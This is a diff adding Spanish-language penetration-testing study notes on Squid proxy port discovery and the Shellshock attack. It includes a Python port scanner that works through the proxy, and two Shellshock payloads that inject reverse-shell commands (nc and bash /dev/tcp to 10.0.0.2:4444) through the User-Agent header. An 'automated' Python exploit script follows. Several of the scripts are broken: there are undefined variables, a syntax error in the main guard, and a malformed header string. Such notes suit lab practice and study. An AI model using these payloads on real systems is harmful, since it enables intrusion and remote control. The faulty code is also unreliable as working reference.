@@ -1006,3 +1006,52 @@ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtes
 ***cadaver*** es otra herramienta para entrar al webdav
 
 # 23. Enumeración y explotación de SQUID Proxies
+el squid proxy es una cache entre el servidor de la web y cliente
+se puede hacer un fuzzing para descubrir directorios del proxy
+
+se usa un squid proxy con foxy proxy, para ver mas puertos que pueden ser ocultos desde el cliente
+
+usar comando curl como:
+- curl http://127.0.0.1:22 --proxy http://192.168.111.39:3128
+```python
+import sys, signal, requests
+
+def def_handler(sig, frame):
+	print("\n\n [!] saliendo!")
+	sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "http://127.0.0.1"
+squid_proxy = {'http': 'http://192.168.111.39:3128'}
+
+def portDiscovery():
+	common_tcp_ports = {...}
+	for tcp_port in common_tcp_ports:
+		request = requests.get(main_url + ":" + str(tcp_port), proxies=squid_proxy)
+		if r.status_code!=503:
+			print(str(tcp_port))
+
+if __name__ == '__main__':
+	portDiscovery()
+```
+# 24. ataque shellshock
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
+curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi"
+
+si hay un /cgi-bin en la maquina que estoy atacando puede ser que sea vulnerable al shellshock
+
+script de python para shellshock automatizado
+```python
+import threading
+def shellshock_attack():
+	headers = {'User-Agent': "() { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi"}
+	r = requests.get(main_url, headers=headers, proxies=squid_proxy)
+
+if __name__='__main__':
+	try:
+		threading.thread(target=shellshock_attack, args=()).start()
+	except Exception as e:
+		log.error(str(e))
+```
+
